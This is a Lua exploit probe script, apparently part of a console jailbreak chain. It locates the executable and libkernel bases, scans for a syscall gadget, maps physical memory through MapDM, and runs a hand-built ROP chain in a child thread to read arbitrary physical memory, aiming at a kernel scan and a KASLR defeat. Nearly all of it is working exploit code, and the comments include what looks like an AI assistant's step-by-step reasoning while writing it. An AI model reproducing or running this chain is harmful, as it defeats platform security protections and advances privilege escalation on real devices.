-- CRASH_CLASS: MODERATE
-- PROBE 561c: Child thread reads MapDM'd physical memory
--
-- 561b confirmed: MapDM accepts ALL physical addresses 0-16GB.
-- But Lua reads crash. Use thr_new child thread with ROP:
--   mov rax,[rsi]; ret → reads from mapped VA
--   mov [rdi],rax; ret → writes to shared buffer
--
-- If this works: ARBITRARY PHYSICAL MEMORY READ → kernel scan → KASLR defeat

print("=== PROBE 561c: CHILD PHYS READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(buf, n)
    for off = 0, n-4, 4 do
        pcall(function() memory.write_dword(buf + off, 0) end)
    end
end

local Z = uint64(0)
local sc6   = mk(6)
local sc20  = mk(20)
local sc73  = mk(73)
local sc477 = mk(477)
local sc455 = mk(455)  -- thr_new
local sc129 = mk(129)  -- sysarch
local sc431 = mk(431)  -- thr_exit
local sc593 = mk(593)

local pid = N(sc20())
print("pid=" .. pid)

-- Get eboot base
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(Z, info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Get libkernel base
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print(string.format("lk=0x%X%08X", lk_hi, lk_lo))

local mapdm_fn = lk + uint64(0x15020)

-- Gadgets
local pop_rax_ret     = eboot + uint64(0x992)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdx_ret     = eboot + uint64(0x3B02D7)
local pop_rcx_ret     = eboot + uint64(0xE64)
local bare_ret        = eboot + uint64(0x42)
local mov_mem_rdi_rax = eboot + uint64(0x92C67)  -- mov [rdi], rax; ret
local mov_rax_mem_rsi = eboot + uint64(0x1A5CC4) -- mov rax, [rsi]; ret

-- syscall; ret — need to find the right offset
-- From CHAIN_14_10.md: the chain uses syscall at some offset
-- Let's search for it at a known location
-- Actually, the probes use a pattern: pop_rax(num) → syscall;ret
-- The syscall;ret gadget should be at an eboot offset
-- From 272a: bare_ret is +0x42. We need syscall;ret.
-- Let me use +0x42 as placeholder and check if it's actually syscall;ret

-- Actually, from the child multi-arg probes, the pattern is:
-- pop_rax → syscall_num → [gadget that does syscall] → ...
-- The syscall;ret needs to be right. Let me scan for 0F 05 C3 in eboot.

-- For now, use the known working pattern from probe 384b (child fake TCB):
-- The chain uses pop_rax_ret → 129 → [syscall_gadget]
-- The syscall gadget must be elsewhere. Let me use a different approach:
-- Instead of syscall from child, just do memory reads and writes.

-- ACTUALLY: the child doesn't need syscalls for reading!
-- The child's ROP chain can just do:
--   mov rax, [rsi]; ret  (read from mapped VA)
--   mov [rdi], rax; ret  (write to shared buf)
-- No syscalls needed except sysarch for TLS and thr_exit at the end.

-- But we DO need sysarch(129) for TLS fix if any subsequent operation
-- touches errno. For pure read/write gadgets, we might not need TLS.
-- Let's try WITHOUT sysarch first — simpler chain.

-- However, thr_exit(431) IS a syscall. So we need syscall;ret.
-- Let me find it. From probes: 271g uses "pop rax; ret" at +0x992 and
-- "syscall; ret" — we need to know where that is.

-- From the CLAUDE.md: pop_rax_ret(+0x992), bare_ret(+0x42)
-- bare_ret at +0x42 is literally just "ret".
-- We need to find "syscall; ret" (0F 05 C3) somewhere.

-- Alternative: instead of thr_exit, we can loop forever or just return
-- to a "ret" sled that eventually faults. Or we can read a byte from
-- eboot to find syscall;ret.

-- Let's scan for 0F 05 C3 near known gadgets
print("")
print("scanning for syscall;ret...")
io.flush()

local syscall_ret = nil
-- Check around known code areas
local scan_offsets = {0x40, 0x41, 0x42, 0x992, 0x993, 0x994}
-- Expand search
for off = 0, 0x2000, 1 do
    local b0 = rb(eboot + off)
    local b1 = rb(eboot + off + 1)
    if b0 ~= nil and b1 ~= nil then
        -- Looking for 0F 05 C3 (syscall; ret) in byte stream
        -- b0 is a dword, we need byte-level access
        -- Actually rb returns a full dword. Let me do byte extraction.
        local byte0 = b0 % 256
        local byte1 = math.floor(b0 / 256) % 256
        local byte2 = math.floor(b0 / 65536) % 256
        local byte3 = math.floor(b0 / 16777216) % 256

        if byte0 == 0x0F and byte1 == 0x05 and byte2 == 0xC3 then
            syscall_ret = eboot + uint64(off)
            print(string.format("  found syscall;ret at eboot+0x%X", off))
            break
        end
        if byte1 == 0x0F and byte2 == 0x05 and byte3 == 0xC3 then
            syscall_ret = eboot + uint64(off + 1)
            print(string.format("  found syscall;ret at eboot+0x%X", off + 1))
            break
        end
        if byte2 == 0x0F and byte3 == 0x05 then
            local next_b = rb(eboot + off + 4)
            if next_b and (next_b % 256) == 0xC3 then
                syscall_ret = eboot + uint64(off + 2)
                print(string.format("  found syscall;ret at eboot+0x%X", off + 2))
                break
            end
        end
    end
end

if not syscall_ret then
    -- Wider scan
    for off = 0x2000, 0x100000, 4 do
        local b0 = rb(eboot + off)
        if b0 ~= nil then
            local byte0 = b0 % 256
            local byte1 = math.floor(b0 / 256) % 256
            local byte2 = math.floor(b0 / 65536) % 256
            local byte3 = math.floor(b0 / 16777216) % 256

            if byte0 == 0x0F and byte1 == 0x05 and byte2 == 0xC3 then
                syscall_ret = eboot + uint64(off)
                print(string.format("  found syscall;ret at eboot+0x%X", off))
                break
            end
            if byte1 == 0x0F and byte2 == 0x05 and byte3 == 0xC3 then
                syscall_ret = eboot + uint64(off + 1)
                print(string.format("  found syscall;ret at eboot+0x%X", off + 1))
                break
            end
        end
    end
end

if not syscall_ret then
    print("  syscall;ret NOT FOUND in first 1MB!")
    print("=== 561c ABORT ===")
    return
end
io.flush()

-- ============================================================
-- SET UP: MapDM a physical page outside GPU pool
-- ============================================================
print("")
print("=== Setting up MapDM page ===")
io.flush()

-- Map physical address 0x200000000 (8GB) — well outside GPU pool
local mapped_va = uint64("0x880000000")
local phys_addr = uint64("0x200000000")

-- Pre-map anonymous page
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)

-- Call MapDM to remap to physical
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z, phys_addr, uint64(0x4000))
end)
local md_rv = ok_md and N(rv_md) or -999
print(string.format("MapDM(phys=0x200000000) rv=%d", md_rv))

if md_rv ~= 0 then
    print("MapDM FAILED! Aborting.")
    return
end

-- ============================================================
-- BUILD CHILD THREAD ROP CHAIN
-- ============================================================
print("")
print("=== Building child ROP chain ===")
io.flush()

-- Shared buffer for results (in normal heap — readable by main thread)
local shared = memory.alloc(0x200)
zero(shared, 0x200)
-- shared+0x00: magic sentinel (child writes 0xDEADFACE when done)
-- shared+0x08: first qword read from mapped page
-- shared+0x10: second qword
-- ... etc

-- Fake TCB for sysarch(SET_FSBASE=129)
local fake_tcb = memory.alloc(0x1000)
zero(fake_tcb, 0x1000)
-- Self-referencing pointer (TCB points to itself at offset 0)
wq(fake_tcb, uint64(fake_tcb))

-- Pointer to fake_tcb (sysarch takes a pointer to the value)
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(fake_tcb))

-- Child thread stack (2MB, 16-byte aligned)
local stack_size = 0x200000
local ok_stk, child_stack = pcall(function()
    return sc477(Z, uint64(stack_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
if not ok_stk then
    print("stack alloc FAIL")
    return
end

-- RSP = top of stack, 16-byte aligned, minus 8 (call convention)
local stack_top = child_stack + uint64(stack_size)
-- Align to 16 bytes then subtract 8
local stack_top_n = N(stack_top)
stack_top_n = math.floor(stack_top_n / 16) * 16 - 8

-- Build ROP chain on the stack
-- Chain layout (each entry is 8 bytes = one qword):
--
-- [0] pop_rax_ret     → sysarch num (129)
-- [1] 129
-- [2] pop_rdi_ret     → arg1: 129 (SET_FSBASE)
-- [3] 129
-- [4] pop_rsi_ret     → arg2: &tcb_ptr
-- [5] &tcb_ptr
-- [6] syscall_ret     → sysarch(129, &tcb_ptr)
-- [7] pop_rsi_ret     → load mapped_va into rsi
-- [8] mapped_va
-- [9] mov_rax_mem_rsi → rax = [mapped_va] (read phys mem!)
-- [10] pop_rdi_ret    → load shared+8 into rdi
-- [11] shared+8
-- [12] mov_mem_rdi_rax → [shared+8] = rax (write result)
-- [13] pop_rsi_ret    → mapped_va + 8
-- [14] mapped_va+8
-- [15] mov_rax_mem_rsi → rax = [mapped_va+8]
-- [16] pop_rdi_ret    → shared+0x10
-- [17] shared+0x10
-- [18] mov_mem_rdi_rax → write second qword
-- [19] pop_rsi_ret    → mapped_va + 16
-- [20] mapped_va+16
-- [21] mov_rax_mem_rsi
-- [22] pop_rdi_ret    → shared+0x18
-- [23] shared+0x18
-- [24] mov_mem_rdi_rax
-- [25] pop_rsi_ret    → mapped_va + 24
-- [26] mapped_va+24
-- [27] mov_rax_mem_rsi
-- [28] pop_rdi_ret    → shared+0x20
-- [29] shared+0x20
-- [30] mov_mem_rdi_rax
-- [31] pop_rdi_ret    → shared+0x00 (sentinel)
-- [32] shared
-- [33] pop_rax_ret
-- [34] 0xDEADFACE     → sentinel value
-- [35] mov_mem_rdi_rax → [shared] = 0xDEADFACE
-- [36] pop_rax_ret    → thr_exit(431)
-- [37] 431
-- [38] pop_rdi_ret    → exit status 0
-- [39] 0
-- [40] syscall_ret

local chain_base = child_stack + uint64(stack_size - 0x1000)

local function wchain(idx, val)
    wq(chain_base + uint64(idx * 8), val)
end

-- sysarch(129, &tcb_ptr)
wchain(0, pop_rax_ret)
wchain(1, uint64(129))
wchain(2, pop_rdi_ret)
wchain(3, uint64(129))        -- SET_FSBASE
wchain(4, pop_rsi_ret)
wchain(5, uint64(tcb_ptr))
wchain(6, syscall_ret)

-- Read 4 qwords from mapped page
local chain_idx = 7
for qi = 0, 3 do
    wchain(chain_idx,     pop_rsi_ret)
    wchain(chain_idx + 1, mapped_va + uint64(qi * 8))
    wchain(chain_idx + 2, mov_rax_mem_rsi)
    wchain(chain_idx + 3, pop_rdi_ret)
    wchain(chain_idx + 4, uint64(shared + 8 + qi * 8))
    wchain(chain_idx + 5, mov_mem_rdi_rax)
    chain_idx = chain_idx + 6
end

-- Write sentinel
wchain(chain_idx,     pop_rdi_ret)
wchain(chain_idx + 1, uint64(shared))
wchain(chain_idx + 2, pop_rax_ret)
wchain(chain_idx + 3, uint64("0xDEADFACE"))
wchain(chain_idx + 4, mov_mem_rdi_rax)
chain_idx = chain_idx + 5

-- thr_exit(431, 0)
wchain(chain_idx,     pop_rax_ret)
wchain(chain_idx + 1, uint64(431))
wchain(chain_idx + 2, pop_rdi_ret)
wchain(chain_idx + 3, Z)
wchain(chain_idx + 4, syscall_ret)

print(string.format("chain: %d entries at 0x%X", chain_idx + 5, N(chain_base)))

-- ============================================================
-- SPAWN CHILD THREAD
-- ============================================================
print("")
print("=== Spawning child thread ===")
io.flush()

-- struct thr_param (0x38 bytes):
-- +0x00: start_func (8)
-- +0x08: arg (8)
-- +0x10: stack_base (8)
-- +0x18: stack_size (8)
-- +0x20: tls_base (8)  — not used
-- +0x28: tls_size (8)  — not used
-- +0x30: child_tid (8)

local thr_param = memory.alloc(0x40)
zero(thr_param, 0x40)

-- start_func = first gadget in chain (pop_rax_ret)
-- But thr_new calls start_func(arg) — arg in rdi
-- The child starts at start_func with rdi=arg, rsp=stack_top
-- We want rsp to point to our chain, so we use pop_rax_ret as start_func
-- and set rsp (stack) to just before the chain

-- Actually, thr_new sets RSP = stack_base + stack_size (top)
-- and RIP = start_func. arg arrives in rdi.
-- We want RIP = bare_ret (just return) so the first thing is to pop
-- the return address from the stack, which would be our chain start.

-- Wait: the call convention for start_func is:
-- RIP = start_func
-- RDI = arg
-- RSP = top of stack
-- The function executes. If it returns, the thread exits.

-- So if start_func = pop_rax_ret, then:
-- pop rax ← pops [RSP] into rax (this is the first qword on the stack)
-- ret ← pops [RSP+8] which is the next gadget address

-- But our chain is at chain_base, not at the stack top.
-- RSP will be at stack_top (stack_base + stack_size), which is ABOVE chain_base.
-- We need RSP to point to chain_base.

-- Solution: set stack_base and stack_size so that stack_top = chain_base
-- chain_base = child_stack + stack_size - 0x1000
-- stack_top should be chain_base
-- So: stack_size_param = stack_size - 0x1000

-- Wait, that's not right either. thr_new sets RSP = (stack_base + stack_size) & ~0xF - 8
-- From probes: RSP = ((stack_base + stack_size) & ~0xF) - 8

-- We want RSP to point to chain_base
-- So: ((stack_base + stack_size_param) & ~0xF) - 8 = chain_base
-- chain_base + 8 = (stack_base + stack_size_param) & ~0xF
-- If chain_base is 16-byte aligned: stack_base + stack_size_param = chain_base + 8

local rsp_target = chain_base
local desired_top = rsp_target + uint64(8)
-- stack_base = child_stack, so stack_size_param = desired_top - child_stack
local stack_size_param = desired_top - child_stack

wq(thr_param + 0x00, pop_rax_ret)      -- start_func = pop rax; ret
wq(thr_param + 0x08, Z)                -- arg (unused, goes to rdi)
wq(thr_param + 0x10, uint64(child_stack)) -- stack_base
wq(thr_param + 0x18, stack_size_param)    -- stack_size
wq(thr_param + 0x20, Z)                -- tls_base
wq(thr_param + 0x28, Z)                -- tls_size

local child_tid = memory.alloc(8)
wq(child_tid, Z)
wq(thr_param + 0x30, uint64(child_tid))  -- child_tid output

-- Launch!
local ok_thr, rv_thr = pcall(function()
    return sc455(uint64(thr_param), uint64(0x38))
end)
local thr_rv = ok_thr and N(rv_thr) or -999
local tid = rb(child_tid) or 0
print(string.format("thr_new rv=%d tid=%d", thr_rv, tid))
io.flush()

-- Wait for child to complete (poll sentinel)
local sentinel = 0
for wait = 1, 100 do
    -- Small busy wait
    for j = 1, 1000 do
        local x = j * j
    end

    sentinel = rb(shared) or 0
    if sentinel == 0xDEADFACE then
        print(string.format("  child done after %d polls", wait))
        break
    end
end

if sentinel ~= 0xDEADFACE then
    print(string.format("  child NOT done (sentinel=0x%08X)", sentinel))
    -- Check if child crashed
    local ok_kill, rv_kill = pcall(function()
        return mk(433)(uint64(tid), Z) -- thr_kill(tid, 0) — check alive
    end)
    local kill_rv = ok_kill and N(rv_kill) or -999
    print(string.format("  thr_kill(tid,%d,0) = %d", tid, kill_rv))
else
    -- READ THE RESULTS!
    print("")
    print("=== PHYSICAL MEMORY READ RESULTS ===")
    print(string.format("phys addr: 0x200000000"))
    for qi = 0, 3 do
        local lo = rb(shared + 8 + qi * 8) or 0
        local hi = rb(shared + 8 + qi * 8 + 4) or 0
        print(string.format("  [+%02X] = 0x%08X%08X", qi * 8, hi, lo))

        -- Check for ELF header
        if qi == 0 and lo == 0x464C457F then
            print("  *** ELF HEADER AT PHYS 0x200000000! ***")
        end
    end
end
io.flush()

-- Cleanup
pcall(function() sc73(mapped_va, uint64(0x4000)) end)
pcall(function() sc73(child_stack, uint64(stack_size)) end)

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " DEAD"))
print("=== 561c DONE ===")
